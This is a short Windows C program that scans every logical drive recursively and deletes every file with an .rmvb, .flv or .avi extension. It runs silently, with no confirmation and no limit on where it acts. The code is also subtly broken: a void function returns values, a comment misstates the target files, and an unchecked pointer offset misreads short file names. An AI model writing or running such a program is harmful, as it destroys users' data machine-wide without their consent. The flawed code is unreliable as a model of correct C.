#include <stdio.h>
#include <string.h>
#include <windows.h>


void delete_videos(const char* szDirPath)
{
	WIN32_FIND_DATA FileData; 
	HANDLE hSearch;  
	char old_cwd[MAX_PATH];

	GetCurrentDirectory(MAX_PATH, old_cwd);
	SetCurrentDirectory(szDirPath);

	// Start searching for .TXT files in the current directory. 
	hSearch = FindFirstFile("*", &FileData); 
	if (hSearch == INVALID_HANDLE_VALUE) 
	{ 
		return 0; 
	} 
	
	do
	{ 
		if(FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			printf("文件夹：%s\n", FileData.cFileName);
			//文件夹
			if(strcmp(FileData.cFileName, ".") != 0 && strcmp(FileData.cFileName, "..") != 0)
					delete_videos(FileData.cFileName);
		}
		else
		{
			//普通文件
			char* p = FileData.cFileName + strlen(FileData.cFileName) - 5;
			
			if(stricmp(p, ".rmvb") == 0 || stricmp(p + 1, ".flv") == 0 || stricmp(p + 1, ".avi") == 0)
			{
				DeleteFile(FileData.cFileName);
			}

			printf("普通文件：%s\n", FileData.cFileName);

		}
	} 
	while(FindNextFile(hSearch, &FileData));
	
	// Close the search handle. 
	FindClose(hSearch);

	SetCurrentDirectory(old_cwd);

	return 0;
}



int main()
{
	char drives[101];
	char* p = drives;

	GetLogicalDriveStrings(sizeof(drives), drives);

	while(*p != '\0')
	{
		//printf("%s\n", p);
		delete_videos(p);
		p += (strlen(p) + 1);
	}
	
	return 0;
}
